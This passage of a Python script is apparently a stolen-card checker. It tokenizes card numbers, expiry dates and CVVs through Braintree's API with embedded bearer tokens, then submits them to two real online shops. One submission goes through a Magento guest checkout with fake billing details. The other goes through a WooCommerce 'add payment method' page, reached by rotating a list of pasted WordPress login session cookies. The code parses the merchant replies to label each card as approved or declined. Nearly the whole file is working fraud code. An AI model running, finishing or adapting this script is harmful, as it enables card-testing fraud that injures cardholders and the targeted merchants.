import requests
import user_agent
import re,json
import random
import time
import string
import base64
from bs4 import BeautifulSoup
def scc(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1] 
	import requests
	
	headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTU5Mzc3NTAsImp0aSI6IjliNDY2N2Y0LWU1MWItNDRmMC05MTE4LWQwODhiNGRhMGRlYiIsInN1YiI6InhrZjY3bndwNmprYjljbTUiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InhrZjY3bndwNmprYjljbTUiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.iR_qsCPCgNMm9CmEhSlA0qatdpecDiAWxWBavsXbbl8--0Hcf1eyN2C2B9QnzigT5exBH1swTYs4gy7pMWx9NA',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
   }
	
	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '83b819fb-b48e-44ca-9e63-7d28572b9663',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
   }
   
	
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	tk=(response.json()["data"]["tokenizeCreditCard"]["token"])
	
	import requests
	
	cookies = {
    'PHPSESSID': 'c9372923dc6045f9cdf187a48e938737',
    'mage-translation-storage': '%7B%7D',
    'mage-translation-file-version': '%7B%7D',
    'form_key': 'o7CsrvEiVAB4fjW9',
    'mage-cache-storage': '%7B%7D',
    'mage-cache-storage-section-invalidation': '%7B%7D',
    'mage-cache-sessid': 'true',
    '_ga': 'GA1.2.920828814.1715851342',
    '_gid': 'GA1.2.1815638461.1715851342',
    'recently_viewed_product': '%7B%7D',
    'recently_viewed_product_previous': '%7B%7D',
    'recently_compared_product': '%7B%7D',
    'recently_compared_product_previous': '%7B%7D',
    'product_data_storage': '%7B%7D',
    'private_content_version': '52fb7cde1df29ba39ae27a1af0ad7c81',
    'mm-qty': '1',
    'mm-amt': '5.9300',
    'mage-messages': '',
    'section_data_ids': '%7B%22customer%22%3A1715851347%2C%22compare-products%22%3A1715851347%2C%22last-ordered-items%22%3A1715851347%2C%22cart%22%3A1715851474%2C%22directory-data%22%3A1715851347%2C%22captcha%22%3A1715851347%2C%22instant-purchase%22%3A1715851347%2C%22persistent%22%3A1715851347%2C%22review%22%3A1715851347%2C%22wishlist%22%3A1715851347%2C%22recently_viewed_product%22%3A1715851347%2C%22recently_compared_product%22%3A1715851347%2C%22product_data_storage%22%3A1715851347%2C%22paypal-billing-agreement%22%3A1715851347%2C%22checkout-fields%22%3A1715851347%2C%22collection-point-result%22%3A1715851347%2C%22pickup-location-result%22%3A1715851347%2C%22messages%22%3A1715851474%7D',
   }
	
	headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://www.michiganmotorz.com',
    'priority': 'u=1, i',
    'referer': 'https://www.michiganmotorz.com/checkout/',
    'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
   }
	
	json_data = {
    'cartId': 'pOKNGx6MBWEWf6y24t8gZUNjCnbwCpXE',
    'billingAddress': {
        'countryId': 'US',
        'regionId': '41',
        'regionCode': 'NJ',
        'region': 'New Jersey',
        'street': [
            '6998 Blanda Flat',
        ],
        'company': '15631 Senger Flat Apt. 437',
        'telephone': '1-725-249-0092',
        'postcode': '91652',
        'city': 'Rueckermouth',
        'firstname': 'yjyjyj',
        'lastname': 'yjyjyjy',
        'saveInAddressBook': None,
    },
    'paymentMethod': {
        'method': 'braintree',
        'additional_data': {
            'payment_method_nonce': tk,
            'device_data': '{"device_session_id":"d232546fa248432a780202daf0ca8943","fraud_merchant_id":null}',
            'amccpa_agreement': '{}',
        },
        'extension_attributes': {
            'agreement_ids': [],
        },
    },
    'email': 'dumliyepsi@gufum.com',
   }

	
	
	response = requests.post(
    'https://www.michiganmotorz.com/rest/default/V1/guest-carts/pOKNGx6MBWEWf6y24t8gZUNjCnbwCpXE/payment-information',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
	try:
		return (response.json()['last_setup_error']['message'])
	except:
		return '3d_secure_2'
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	user = user_agent.generate_user_agent()
	if "20" in yy:#JONY
		yy = yy.split("20")[1]
	with open('fileb3.txt', 'r') as file:
		first_line = file.readline()
	while True:
		lines="""
hshsksbsh%7C1717848161%7CwcwfVbKOPVrFnWMFMbaPDZAksgyxmvdGiIhR4KyiHnA%7Ca4d699fa31f29096732c754ae5702b7e389817632869b172801165cf52bc1f53
hshsjsjsps%7C1717848307%7Cuy3AZOvZHiNV4r4LtTTQsPtNZBKEB7KOWzMoyAg9Zju%7Cc1ac0b5efeb2789c3057771eb894aacf88cf82760476229b563f57bc54614151
aodbkd%7C1717848440%7Ca4jplqH4Mai08vyRm2V6EryJBhqAcivpU2eMAjm4So0%7Ccec7d7c05ee6232b8d811fb21bfbd882ff70b2c39957f0ff6c90505937f528c8
zekoomo%7C1717075076%7C9hLBmVMkbspscUTLLJAeThoICrZjnjujEXazeFOii9T%7Ce8a114e6854cd418971aca30c65c93cb7762abf35ed3b1671a29417f5baaaecd
zekoamoh%7C1717075183%7CbzlnKVCDAMtpTEl91P7RB0waAjp3YPbCF1UCG5d8WDn%7Ce973023ef1ac42df2c75642075094622cf04a205cae38a5a3bf47ee49be0c24c
mozekomoz%7C1717075782%7CqBfU0xO8YE4kpkqQmPcyHoajIHRWVQ6sAsFqVNrjrU3%7Ce684d43fd88396d277c668f7c2dff54867ac5acf727dbdb173bd988fce0bd781
zekomozeko%7C1717075946%7C9z9iHtCF6lHdyTnXWA8TMJUzUdyUoy52kopbmpZjkIx%7C3ee88716e74c307431e58db1ae4378ab32b46ac00e9070d2dd90d5ddd7cda22e
shhsjahs%7C1717860047%7CDyms60VcLh0cDbwIZqcwEn0W84mX9hW2ciFg3CkonXQ%7Cb81d8ab30d934539076693d3b3e429604996929df9e68dbd29f9e85fd14a29f7
skhwjs%7C1717860110%7C09D1YI7KTdMKgy9wkVMUWH97TBod5lSGFhkJpk3c0ND%7Ce848294f432a31e77d99fea0d679a8386af9ca8d129010252ce04d6b94b91d7a
jsgwjwh%7C1717860168%7CRUV5GxopH0l8gw11zP5IIqmEeX5rs3KaewikIA0K3C5%7C284c3a630ed4e1197151a70156c4ae763e0bd09411cabad51f3b5f39d891e2e9
sushjwjs%7C1717860224%7Cd0eLgGaGHTncwtuOKpjczaJZbMwDKTtPW30xv0LGD7K%7C90e029553c7f67dbeba9fb56e8d6191d5ae014687f8ff18b365fd50ef483af6a
jshwjw%7C1717860310%7CFFlkt2qXFt25fjDGctvMxyOnvwcjMetHkSra9u8i3x5%7C27ff984271a909a9482deb041294e52277699db7fac15d30695542c2441790b2
pvsjsvqis%7C1717860448%7CIu7xxG4i4m2Q8FyhS1g3j49J8DvgmvykpCu9mJbpFJu%7Ce708ee4e6dee7c8e8d773b95b4b34f3619ec02280ff23570d83f0c1d3aa6a73fsjwhoqhsjs%7C1717860502%7Ct59gHcZO9503EakRocNy5aIlLyfDjKHJlE73RI82w3U%7Cdb8a07cf91880e9ab8707f5e55fcd0a5882c9aa8998938d6eadcbd781a70924dqolqbdjsjwbsj%7C1717860858%7C0iGZLOf7sFzILFp2o40tlG7mzzeHF446qS7KdXgAh2j%7C20d626d82ae9f7d23d537d74b58585d1f26d32f623549d0ccbfd6ac5b3b1cc50qigsosh%7C1717861092%7C2XnHqHeYBNhJKqrtx0UQ0C4JNd9xmWUgNeXsi3MZtGq%7Cad9e6e6859aa73213220648a834177874b315ff4ff421b24b4c2c60d4f482722
phddjwkvsjsh%7C1717861172%7Cf5tJRX2VdJIipKzJu83CEWTuH0tfvNQ4CAsc86afK2r%7C704a1a07202a3c378605223e795e5b431fef2e7328ce900d19a8babea1d2c315
ajqljakshs%7C1718022141%7C2B7L4o35WNWoklGleedA6xgElkBrgweMh7BVSiHeaXO%7C1af26096d9b01d5c2c76df924c4bb0dde22e367196b2a69599017f683e585d4c
ajgajavah%7C1718021639%7Cdkc6Tyhwc1qhs7m8HJR7ltwPrBhyrewR7nGVU9PKDOU%7C07af63d75fb1467cf6ded66968b9a847b3def4f1839bc868247a0d2b2a338656
kwhwihwhw%7C1718021779%7CMSmesz3oUFeepUT2KOVu5ZYjxl4aOGIC3UVfns8HlGC%7C754d295f9b08d8a7e7f99d5851d0ea895de4a7aac94ed86ae03f97ae6f96ce70
wkqhwi%7C1718021840%7Cwj7gTeHmYHn7DSU4hA8A07HW0WBNRrgqz8xHjq8jT6X%7C8025eaac5adffd7682ed399ca8a70737a03083af310c09a6edd4b3a5efc8334e"""
		lines = lines.strip().split('\n')
		random_line_number = random.randint(0, len(lines) - 1)
		big = lines[random_line_number]
		if big == first_line:
			pass
		else:
			break
	with open('fileb3.txt', 'w') as file:
		file.write(big)
	cookies = {
	    'wssplashuid': '3cb27488267f6f4294c90e8d8ce7e91d292c03fa.1715037173.1',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2024-05-06%2023%3A21%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.annarosaskincare.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.annarosaskincare.com%2F',
	    'sbjs_first_add': 'fd%3D2024-05-06%2023%3A21%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.annarosaskincare.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.annarosaskincare.com%2F',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
	    'pixelcat_id': '3162bd1de5',
	    '_omappvp': 'wrGEytX41377F1u6cTLFHl9xFh16ivE3GNqBs0HS6TDvODHyB1zmqAa2SkSGp4cXZCrHv9Q5uQxQzWswFWvOFZeGEdcOYqT0',
	    '_gcl_au': '1.1.460234453.1715037717',
	    '_ga': 'GA1.1.1426328219.1715037717',
	    '_fbp': 'fb.1.1715037717032.298791665',
	    '_omappvs': '1715037978618',
	    'omSeen-brgbxa1tkhfdya4uuekg': '1715037980746',
	    '_lscache_vary': 'b65bf87edec07f81ededf6aa0d5cf54f',
	    'wordpress_logged_in_71d75a39a4ff95f3d589fe53a81a64b1': big,
	    'wfwaf-authcookie-5051286a9e2b2d2fab68263a1c3de8db': '3620%7Cother%7Cread%7C2a44d76cd76da4706f17317bc4725e2294837b2c2e6992d2f3ae5346eb694cec',
	    '_ga_M6LZD72P57': 'GS1.1.1715037716.1.1.1715038031.45.0.0',
	    'sbjs_session': 'pgs%3D17%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.annarosaskincare.com%2Fmy-account%2Fpayment-methods%2F',
	}
	
	headers = {
	    'authority': 'www.annarosaskincare.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'referer': 'https://www.annarosaskincare.com/my-account/payment-methods/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	response = requests.get('https://www.annarosaskincare.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
	dec = base64.b64decode(enc).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '6778b0be-5124-4574-b38a-9fbeaa061ed8',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	                'billingAddress': {
	                    'postalCode': '10080',
	                    'streetAddress': 'new york 45',
	                },
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	cookies = {
	    'wssplashuid': '3cb27488267f6f4294c90e8d8ce7e91d292c03fa.1715037173.1',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2024-05-06%2023%3A21%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.annarosaskincare.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.annarosaskincare.com%2F',
	    'sbjs_first_add': 'fd%3D2024-05-06%2023%3A21%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.annarosaskincare.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.annarosaskincare.com%2F',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
	    'pixelcat_id': '3162bd1de5',
	    '_omappvp': 'wrGEytX41377F1u6cTLFHl9xFh16ivE3GNqBs0HS6TDvODHyB1zmqAa2SkSGp4cXZCrHv9Q5uQxQzWswFWvOFZeGEdcOYqT0',
	    '_gcl_au': '1.1.460234453.1715037717',
	    '_ga': 'GA1.1.1426328219.1715037717',
	    '_fbp': 'fb.1.1715037717032.298791665',
	    '_omappvs': '1715037978618',
	    'omSeen-brgbxa1tkhfdya4uuekg': '1715037980746',
	    '_lscache_vary': 'b65bf87edec07f81ededf6aa0d5cf54f',
	    'wordpress_logged_in_71d75a39a4ff95f3d589fe53a81a64b1': big,
	    'wfwaf-authcookie-5051286a9e2b2d2fab68263a1c3de8db': '3620%7Cother%7Cread%7C2a44d76cd76da4706f17317bc4725e2294837b2c2e6992d2f3ae5346eb694cec',
	    '_ga_M6LZD72P57': 'GS1.1.1715037716.1.1.1715038031.45.0.0',
	    'sbjs_session': 'pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.annarosaskincare.com%2Fmy-account%2Fadd-payment-method%2F',
	}
	
	headers = {
	    'authority': 'www.annarosaskincare.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://www.annarosaskincare.com',
	    'referer': 'https://www.annarosaskincare.com/my-account/add-payment-method/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	data = {
	    'payment_method': 'braintree_cc',
	    'braintree_cc_nonce_key': tok,
	    'braintree_cc_device_data': '{"device_session_id":"5f49647bdd93c3e04115f1a3ab40a200","fraud_merchant_id":null,"correlation_id":"f063c955214bae19fb05c0f2ed9afdda"}',
	    'braintree_cc_3ds_nonce_key': '',
	    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/f8mwyf6zpp2fnqm8/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/f8mwyf6zpp2fnqm8"},"merchantId":"f8mwyf6zpp2fnqm8","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Discover","Maestro","UK Maestro","MasterCard","Visa"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI5ODBlZTM4Ny00YjFhLTRiOTQtYjI2Mi03M2Y0ZTg2NjA5ZTMiLCJpYXQiOjE3MTUwMzgwNzQsImV4cCI6MTcxNTA0NTI3NCwiaXNzIjoiNjA2MjcwNzU4OGVhZmY2MGQ0MGRkOTE4IiwiT3JnVW5pdElkIjoiNjA2MjcwNzVhN2E3NTE2NDU3M2U0ZmRiIn0.ij0iVOqqNfs9QzqnthQDzop3vu1uZEIsBYOkfVnhQc4"},"paypalEnabled":true,"paypal":{"displayName":"Anna Rosa Skincare","clientId":"ATwBtXltSZ2U53P14qpEfnxGV80o1qL8gCqheeFBEPq51Of8c2tqohHkDchF4v9KjoQzPgttvoB03WvZ","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"annarosaskincareUSD","payeeEmail":null,"currencyIsoCode":"USD"}}',
	    'woocommerce-add-payment-method-nonce': add_nonce,
	    '_wp_http_referer': '/my-account/add-payment-method/',
	    'woocommerce_add_payment_method': '1',
	}
	
	response = requests.post(
	    'https://www.annarosaskincare.com/my-account/add-payment-method/',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'Payment method successfully added.' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "Error"
			print('er#')
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return 'Approved'
	else:
		return result
def st(card):
	import re
	card = card.strip()
	parts = re.split('[|]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
	if "20" in yy:
		yy = yy.split("20")[1]
		import requests
	import requests
	
	headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTU5Mzc3NTAsImp0aSI6IjliNDY2N2Y0LWU1MWItNDRmMC05MTE4LWQwODhiNGRhMGRlYiIsInN1YiI6InhrZjY3bndwNmprYjljbTUiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InhrZjY3bndwNmprYjljbTUiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.iR_qsCPCgNMm9CmEhSlA0qatdpecDiAWxWBavsXbbl8--0Hcf1eyN2C2B9QnzigT5exBH1swTYs4gy7pMWx9NA',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
   }
	with open('gates.json', 'r') as file:
		json_data = json.load(file)
	sis=json_data['session']
	no=json_data['payNo']
	print('#')
	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '83b819fb-b48e-44ca-9e63-7d28572b9663',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
   }
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tk=(response.json()["data"]["tokenizeCreditCard"]["token"])
	cookies = {
    'PHPSESSID': 'c9372923dc6045f9cdf187a48e938737',
    'mage-translation-storage': '%7B%7D',
    'mage-translation-file-version': '%7B%7D',
    'form_key': 'o7CsrvEiVAB4fjW9',
    'mage-cache-storage': '%7B%7D',
    'mage-cache-storage-section-invalidation': '%7B%7D',
    'mage-cache-sessid': 'true',
    '_ga': 'GA1.2.920828814.1715851342',
    '_gid': 'GA1.2.1815638461.1715851342',
    'recently_viewed_product': '%7B%7D',
    'recently_viewed_product_previous': '%7B%7D',
    'recently_compared_product': '%7B%7D',
    'recently_compared_product_previous': '%7B%7D',
    'product_data_storage': '%7B%7D',
    'private_content_version': '52fb7cde1df29ba39ae27a1af0ad7c81',
    'mm-qty': '1',
    'mm-amt': '5.9300',
    'mage-messages': '',
    'section_data_ids': '%7B%22customer%22%3A1715851347%2C%22compare-products%22%3A1715851347%2C%22last-ordered-items%22%3A1715851347%2C%22cart%22%3A1715851474%2C%22directory-data%22%3A1715851347%2C%22captcha%22%3A1715851347%2C%22instant-purchase%22%3A1715851347%2C%22persistent%22%3A1715851347%2C%22review%22%3A1715851347%2C%22wishlist%22%3A1715851347%2C%22recently_viewed_product%22%3A1715851347%2C%22recently_compared_product%22%3A1715851347%2C%22product_data_storage%22%3A1715851347%2C%22paypal-billing-agreement%22%3A1715851347%2C%22checkout-fields%22%3A1715851347%2C%22collection-point-result%22%3A1715851347%2C%22pickup-location-result%22%3A1715851347%2C%22messages%22%3A1715851474%7D',
   }
	headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://www.michiganmotorz.com',
    'priority': 'u=1, i',
    'referer': 'https://www.michiganmotorz.com/checkout/',
    'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
   }
	
	json_data = {
    'cartId': 'pOKNGx6MBWEWf6y24t8gZUNjCnbwCpXE',
    'billingAddress': {
        'countryId': 'US',
        'regionId': '41',
        'regionCode': 'NJ',
        'region': 'New Jersey',
        'street': [
            '6998 Blanda Flat',
        ],
        'company': '15631 Senger Flat Apt. 437',
        'telephone': '1-725-249-0092',
        'postcode': '91652',
        'city': 'Rueckermouth',
        'firstname': 'yjyjyj',
        'lastname': 'yjyjyjy',
        'saveInAddressBook': None,
    },
    'paymentMethod': {
        'method': 'braintree',
        'additional_data': {
            'payment_method_nonce': tk,
            'device_data': '{"device_session_id":"d232546fa248432a780202daf0ca8943","fraud_merchant_id":null}',
            'amccpa_agreement': '{}',
        },
        'extension_attributes': {
            'agreement_ids': [],
        },
    },
    'email': 'dumliyepsi@gufum.com',
   }
	
	response = requests.post(
    'https://www.michiganmotorz.com/rest/default/V1/guest-carts/pOKNGx6MBWEWf6y24t8gZUNjCnbwCpXE/payment-information',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
	if 'success' in response.text:
		return 'success'
	elif 'There is no session information. Please order again.' in response.text:
		headers = {
		    'accept': 'application/json',
		    'cache-control': 'no-cache',
		    'content-type': 'application/json',
		    'pragma': 'no-cache',
